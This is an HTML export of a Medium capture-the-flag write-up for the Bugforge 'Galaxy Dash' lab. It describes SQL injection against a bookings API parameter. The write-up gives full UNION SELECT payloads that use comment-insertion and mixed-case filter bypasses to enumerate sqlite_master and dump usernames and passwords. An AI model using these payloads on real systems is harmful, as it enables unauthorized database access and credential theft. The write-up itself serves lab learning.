@@ -1,0 +1,72 @@
+<!DOCTYPE html><html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title>Galaxy Dash writeup (SQLi) (Bugforge)</title><style>
+      * {
+        font-family: Georgia, Cambria, "Times New Roman", Times, serif;
+      }
+      html, body {
+        margin: 0;
+        padding: 0;
+      }
+      h1 {
+        font-size: 50px;
+        margin-bottom: 17px;
+        color: #333;
+      }
+      h2 {
+        font-size: 24px;
+        line-height: 1.6;
+        margin: 30px 0 0 0;
+        margin-bottom: 18px;
+        margin-top: 33px;
+        color: #333;
+      }
+      h3 {
+        font-size: 30px;
+        margin: 10px 0 20px 0;
+        color: #333;
+      }
+      header {
+        width: 640px;
+        margin: auto;
+      }
+      section {
+        width: 640px;
+        margin: auto;
+      }
+      section p {
+        margin-bottom: 27px;
+        font-size: 20px;
+        line-height: 1.6;
+        color: #333;
+      }
+      section img {
+        max-width: 640px;
+      }
+      footer {
+        padding: 0 20px;
+        margin: 50px 0;
+        text-align: center;
+        font-size: 12px;
+      }
+      .aspectRatioPlaceholder {
+        max-width: auto !important;
+        max-height: auto !important;
+      }
+      .aspectRatioPlaceholder-fill {
+        padding-bottom: 0 !important;
+      }
+      header,
+      section[data-field=subtitle],
+      section[data-field=description] {
+        display: none;
+      }
+      </style></head><body><article class="h-entry">
+<header>
+<h1 class="p-name">Galaxy Dash writeup (SQLi) (Bugforge)</h1>
+</header>
+<section data-field="subtitle" class="p-summary">
+Step 1: Register and proxy traffic
+</section>
+<section data-field="body" class="e-content">
+<section name="f289" class="section section--body section--first section--last"><div class="section-divider"><hr class="section-divider"></div><div class="section-content"><div class="section-inner sectionLayout--insetColumn"><h3 name="837b" id="837b" class="graf graf--h3 graf--leading graf--title">Galaxy Dash writeup (SQLi) (Bugforge)</h3><figure name="ad3f" id="ad3f" class="graf graf--figure graf-after--h3"><img class="graf-image" data-image-id="1*cgMJ5jPyXen5B9leVD-ZQg.png" data-width="570" data-height="320" src="https://cdn-images-1.medium.com/max/800/1*cgMJ5jPyXen5B9leVD-ZQg.png"></figure><p name="95f5" id="95f5" class="graf graf--p graf-after--figure">Step 1: Register and proxy traffic</p><p name="cb62" id="cb62" class="graf graf--p graf-after--p">As the title says, register &amp; proxy. Then go over to the Deliveries tab.</p><figure name="4501" id="4501" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*ia2RoOnFdbDkoX0JAdRF8Q.png" data-width="722" data-height="411" src="https://cdn-images-1.medium.com/max/800/1*ia2RoOnFdbDkoX0JAdRF8Q.png"></figure><p name="9319" id="9319" class="graf graf--p graf-after--figure">Step 2: Interesting traffic</p><p name="7921" id="7921" class="graf graf--p graf-after--p">This stood out to me. As soon as I hit the delivery page, there was a ?limit=5 prior to this hit, and when I hit “Pending”, I thought that this could be SQLi related as it was pulling information from the database. It seemed like a good place to begin:</p><figure name="0cf1" id="0cf1" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*26yAUpiGPT4rQE0WJyQ2mw.png" data-width="852" data-height="320" src="https://cdn-images-1.medium.com/max/800/1*26yAUpiGPT4rQE0WJyQ2mw.png"></figure><p name="326c" id="326c" class="graf graf--p graf-after--figure">Step 3: Burp community + mac</p><p name="63bb" id="63bb" class="graf graf--p graf-after--p">I was on burp community…on a mac. I didn’t have anything more fancy. So we’d have to go at it manually. A single quote broke the syntax and resulted in a 500 error:</p><figure name="4453" id="4453" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*ToPN8-IKcUHq6yjPv4c05Q.png" data-width="542" data-height="254" src="https://cdn-images-1.medium.com/max/800/1*ToPN8-IKcUHq6yjPv4c05Q.png"></figure><p name="7a83" id="7a83" class="graf graf--p graf-after--figure">Step 4: 400 Bad request</p><p name="3c56" id="3c56" class="graf graf--p graf-after--p">Next, I got a 400 bad request (see next step for the fix):</p><figure name="2ca9" id="2ca9" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*gbpOjq7vj8KV09Fn3BnIQA.png" data-width="619" data-height="238" src="https://cdn-images-1.medium.com/max/800/1*gbpOjq7vj8KV09Fn3BnIQA.png"></figure><p name="ce8d" id="ce8d" class="graf graf--p graf-after--figure">URL encoding of the same payload gave me a 200 OK:</p><figure name="d6ec" id="d6ec" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*enJCDWw42KmpHaTyL6P1Gg.png" data-width="705" data-height="256" src="https://cdn-images-1.medium.com/max/800/1*enJCDWw42KmpHaTyL6P1Gg.png"></figure><p name="7827" id="7827" class="graf graf--p graf-after--figure">Step 5: UnIoN SeLeCt</p><p name="596f" id="596f" class="graf graf--p graf-after--p">I got a 500 error and I’d tried some ‘or’ commands and it didn’t seem to play well. So at this point, I went off to <a href="https://portswigger.net/support/sql-injection-bypassing-common-filters" data-href="https://portswigger.net/support/sql-injection-bypassing-common-filters" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">Portswigger</a> to look at WAF bypasses.</p><figure name="aa5f" id="aa5f" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*jRZ6zaPrnHgAYf5MHTBSfg.png" data-width="705" data-height="241" src="https://cdn-images-1.medium.com/max/800/1*jRZ6zaPrnHgAYf5MHTBSfg.png"></figure><p name="6892" id="6892" class="graf graf--p graf-after--figure">Portswigger said that /**/ can be “inserted within keywords themselves, which provides another means of bypassing some input validation filters while preserving the syntax of the actual query: SEL/**/EC”</p><p name="a3db" id="a3db" class="graf graf--p graf-after--p">This sounded worth a try. So, combining it with camel case (which now, I’m not sure is even necessary, but hey, this is what I did) I had the following payload. But… it resulted in a 500 error (note the double dash at the end. medium.com doesn’t play well with double dashes):</p><blockquote name="96fc" id="96fc" class="graf graf--blockquote graf-after--p">GET /api/bookings?status=’/**/uNiOn/**/sElEcT/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 —</blockquote><figure name="5de1" id="5de1" class="graf graf--figure graf-after--blockquote"><img class="graf-image" data-image-id="1*3SNA36ueQgevjYtue3jwMw.png" data-width="691" data-height="256" src="https://cdn-images-1.medium.com/max/800/1*3SNA36ueQgevjYtue3jwMw.png"></figure><p name="d603" id="d603" class="graf graf--p graf-after--figure">26 was the magic number of columns before I got a 200 ok:</p><figure name="9e26" id="9e26" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*9gMUrBsONCSBtdlcMxjLKw.png" data-width="700" data-height="279" src="https://cdn-images-1.medium.com/max/800/1*9gMUrBsONCSBtdlcMxjLKw.png"></figure><p name="43bc" id="43bc" class="graf graf--p graf-after--figure">Step 6: sqlite_version() fail</p><p name="8060" id="8060" class="graf graf--p graf-after--p">I couldn’t enumerate for sqlite_version or @@version. Neither worked:</p><figure name="be65" id="be65" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*g8usN-jE-sFqhP3NRdk7kw.png" data-width="699" data-height="212" src="https://cdn-images-1.medium.com/max/800/1*g8usN-jE-sFqhP3NRdk7kw.png"></figure><p name="0576" id="0576" class="graf graf--p graf-after--figure">So I went for the ‘name’ column in the sqlite_master table and show type=’table’ which would filter the results to only show tables (not indexes or other objects)</p><blockquote name="9fc2" id="9fc2" class="graf graf--blockquote graf-after--p">GET /api/bookings?status=’/**/uNiOn/**/sElEcT/**/name,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26/**/fRoM/**/sqlite_master/**/wHeRe/**/type=’table’ —</blockquote><figure name="582a" id="582a" class="graf graf--figure graf-after--blockquote"><img class="graf-image" data-image-id="1*792j3aI8wJ9kDwZReziLxA.png" data-width="703" data-height="246" src="https://cdn-images-1.medium.com/max/800/1*792j3aI8wJ9kDwZReziLxA.png"></figure><p name="a076" id="a076" class="graf graf--p graf-after--figure">Step 7: Dump</p><p name="61ea" id="61ea" class="graf graf--p graf-after--p">I changed column 1 back to 1 (was ‘name’ in previous step) and then column 6,7 to username,password respectively and hit send, which resulted in the username / flag being displayed in the response.</p><p name="f51c" id="f51c" class="graf graf--p graf-after--p">Final payload:</p><blockquote name="2636" id="2636" class="graf graf--blockquote graf-after--p">GET /api/bookings?status=’/**/uNiOn/**/sElEcT/**/1,2,3,4,5,username,password,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26/**/fRoM/**/’users’ —</blockquote><figure name="f06e" id="f06e" class="graf graf--figure graf-after--blockquote"><img class="graf-image" data-image-id="1*I_pas5yG4qwv_Wjg6dg0XA.png" data-width="704" data-height="281" src="https://cdn-images-1.medium.com/max/800/1*I_pas5yG4qwv_Wjg6dg0XA.png"></figure><p name="5f69" id="5f69" class="graf graf--p graf-after--figure">Thanks for reading!</p><p name="31ad" id="31ad" class="graf graf--p graf-after--p graf--trailing">🍺 Quick message to readers: if my writeups help you, please consider a small donation to my buymeacoffee link <a href="http://buymeacoffee.com/7s26simon" data-href="http://buymeacoffee.com/7s26simon" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">here</a>. This is not required but is very much appreciated! 🍺</p></div></div></section>
+</section>
+<footer><p>By <a href="https://medium.com/@7s26simon" class="p-author h-card">7s26Simon</a> on <a href="https://medium.com/p/08ddb098fbc1"><time class="dt-published" datetime="2026-03-02T08:02:21.735Z">March 2, 2026</time></a>.</p><p><a href="https://medium.com/@7s26simon/galaxy-dash-writeup-sqli-bugforge-08ddb098fbc1" class="p-canonical">Canonical link</a></p><p>Exported from <a href="https://medium.com">Medium</a> on June 13, 2026.</p></footer></article></body></html>
